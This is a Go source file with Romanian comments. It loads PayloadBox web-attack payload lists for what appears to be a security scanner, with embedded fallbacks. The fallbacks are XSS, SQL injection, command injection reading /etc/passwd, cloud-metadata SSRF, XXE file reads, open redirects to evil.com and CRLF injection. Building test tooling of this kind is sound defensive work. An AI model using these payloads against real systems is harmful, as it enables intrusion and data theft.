// Package payloads — PayloadBox integration
// Source: https://github.com/payload-box (Ismail Taşedelen)
// License: MIT
//
// Toate listele sunt descărcate la startup din GitHub raw content.
// Fallback: liste embedded minime dacă GitHub e inaccesibil.
//
// Usage:
//   reg := payloads.NewRegistry()
//   list, _ := reg.Get(payloads.TypeXSS)
//   list, _ := reg.Get(payloads.TypeSQLi)

package payloads

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog/log"
)

// PayloadType identifică categoria de payload.
type PayloadType string

const (
	TypeXSS              PayloadType = "xss"
	TypeSQLi             PayloadType = "sqli"
	TypeCommandInjection PayloadType = "cmd-injection"
	TypeSSRF             PayloadType = "ssrf"
	TypeOpenRedirect     PayloadType = "open-redirect"
	TypeXXE              PayloadType = "xxe"
	TypeSSTI             PayloadType = "ssti"
	TypeWAFBypass        PayloadType = "waf-bypass"
	TypeCRLF             PayloadType = "crlf"
	TypeCSV              PayloadType = "csv-injection"
	TypeDirectory        PayloadType = "directory"
	TypeProtocol         PayloadType = "protocol-injection"
	TypeHTTPSmuggling    PayloadType = "http-smuggling"
)

// payloadSource mapează tipul → URL raw GitHub
var payloadSources = map[PayloadType]string{
	TypeXSS:              "https://raw.githubusercontent.com/payload-box/xss-payload-list/main/Intruder/xss-payload-list.txt",
	TypeSQLi:             "https://raw.githubusercontent.com/payload-box/sql-injection-payload-list/main/Intruder/SQL-Injection-Auth-Bypass-Payloads.txt",
	TypeCommandInjection: "https://raw.githubusercontent.com/payload-box/command-injection-payload-list/main/README.md",
	TypeSSRF:             "https://raw.githubusercontent.com/payload-box/ssrf-payload-list/main/README.md",
	TypeOpenRedirect:     "https://raw.githubusercontent.com/payload-box/open-redirect-payload-list/main/open-redirect-payload-list.txt",
	TypeXXE:              "https://raw.githubusercontent.com/payload-box/xxe-injection-payload-list/main/README.md",
	TypeSSTI:             "https://raw.githubusercontent.com/payload-box/ssti-advanced-payload-list/main/README.md",
	TypeWAFBypass:        "https://raw.githubusercontent.com/payload-box/waf-bypass-payload-list/main/README.md",
	TypeCRLF:             "https://raw.githubusercontent.com/payload-box/crlf-injection-payload-list/main/README.md",
	TypeCSV:              "https://raw.githubusercontent.com/payload-box/csv-injection-payload-list/main/README.md",
	TypeDirectory:        "https://raw.githubusercontent.com/payload-box/directory-payload-list/main/README.md",
	TypeProtocol:         "https://raw.githubusercontent.com/payload-box/protocol-injection-payload-list/main/README.md",
	TypeHTTPSmuggling:    "https://raw.githubusercontent.com/payload-box/http-request-smuggling-payloads/main/README.md",
}

// Fallback minimal embedded — folosit dacă GitHub e inaccesibil
var embeddedFallback = map[PayloadType][]string{
	TypeXSS:              {"<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"},
	TypeSQLi:             {"' OR '1'='1", "' OR 1=1--", "admin'--", "1' AND 1=1--"},
	TypeCommandInjection: {"; id", "| id", "$(id)", "`id`", "; cat /etc/passwd"},
	TypeSSRF:             {"http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://[::1]/"},
	TypeOpenRedirect:     {"//evil.com", "https://evil.com", "javascript:alert(1)", "//google.com/%2f.."},
	TypeXXE:              {"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"},
	TypeSSTI:             {"{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"},
	TypeWAFBypass:        {"<ScRiPt>alert(1)</ScRiPt>", "%3Cscript%3Ealert(1)%3C/script%3E"},
	TypeCRLF:             {"%0d%0aSet-Cookie:crlfinjection=crlfinjection", "\r\nSet-Cookie:crlfinjection=crlfinjection"},
}

// Registry cache pentru payload lists.
type Registry struct {
	mu     sync.RWMutex
	cache  map[PayloadType][]string
	loaded map[PayloadType]bool
	client *http.Client
}

func NewRegistry() *Registry {
	return &Registry{
		cache:  make(map[PayloadType][]string),
		loaded: make(map[PayloadType]bool),
		client: &http.Client{Timeout: 15 * time.Second},
	}
}

// Get returnează lista de payload-uri pentru un tip dat.
// Descarcă din GitHub la primul apel, cachează în memorie.
// Dacă descărcarea eșuează → returnează fallback embedded.
func (r *Registry) Get(t PayloadType) ([]string, error) {
	r.mu.RLock()
	if r.loaded[t] {
		payloads := r.cache[t]
		r.mu.RUnlock()
		return payloads, nil
	}
	r.mu.RUnlock()

	// Load din GitHub
	payloads, err := r.fetchFromGitHub(t)
	if err != nil {
		log.Warn().
			Err(err).
			Str("type", string(t)).
			Msg("payloads: GitHub fetch failed — using embedded fallback")
		payloads = embeddedFallback[t]
	}

	r.mu.Lock()
	r.cache[t] = payloads
	r.loaded[t] = true
	r.mu.Unlock()

	log.Info().
		Str("type", string(t)).
		Int("count", len(payloads)).
		Msg("payloads: loaded")

	return payloads, nil
}

// PreloadAll descarcă toate listele în background la startup.
func (r *Registry) PreloadAll() {
	go func() {
		for t := range payloadSources {
			r.Get(t)
			time.Sleep(200 * time.Millisecond) // rate limit GitHub
		}
		log.Info().Msg("payloads: all lists preloaded from payload-box")
	}()
}

// Stats returnează câte payload-uri sunt încărcate per tip.
func (r *Registry) Stats() map[string]int {
	r.mu.RLock()
	defer r.mu.RUnlock()
	stats := make(map[string]int)
	for t, list := range r.cache {
		stats[string(t)] = len(list)
	}
	return stats
}

func (r *Registry) fetchFromGitHub(t PayloadType) ([]string, error) {
	url, ok := payloadSources[t]
	if !ok {
		return nil, fmt.Errorf("unknown payload type: %s", t)
	}

	resp, err := r.client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d from %s", resp.StatusCode, url)
	}

	return parsePayloadLines(resp.Body), nil
}

// parsePayloadLines extrage liniile non-goale, non-comentariu din fișier.
func parsePayloadLines(r io.Reader) []string {
	var lines []string
	scanner := bufio.NewScanner(r)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024) // 1MB buffer

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
			continue
		}
		// Skip markdown headers și alte linii non-payload din README-uri
		if strings.HasPrefix(line, "##") || strings.HasPrefix(line, "**") {
			continue
		}
		lines = append(lines, line)
	}
	return lines
}
